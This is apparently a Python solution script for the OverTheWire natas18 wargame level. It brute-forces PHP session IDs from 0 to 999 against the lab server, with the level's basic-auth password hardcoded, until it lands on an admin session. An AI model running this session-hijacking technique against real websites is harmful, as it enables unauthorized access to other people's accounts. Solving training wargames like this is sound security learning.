#! /bin/python
import requests, string, sys
url = "http://natas18.natas.labs.overthewire.org"
username = "natas18"
password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"
characters = ''.join([string.digits, string.ascii_letters])
passchar = []

s_msg = 'You are an admin'
f_msg = 'You are logged in as a regular user'

for sesid in range(0, 1000):
    cookie = dict(PHPSESSID=str(sesid))
    query = '/index.php?username=admin&password=test&debug'
    uri = url+query
    r = requests.get(uri, auth=(username, password), cookies=cookie)
    if(s_msg in r.text):
        print("Success {}".format(r.text))
        sys.exit()
    elif f_msg in r.text:
        print("Fail SessID# {}".format(sesid))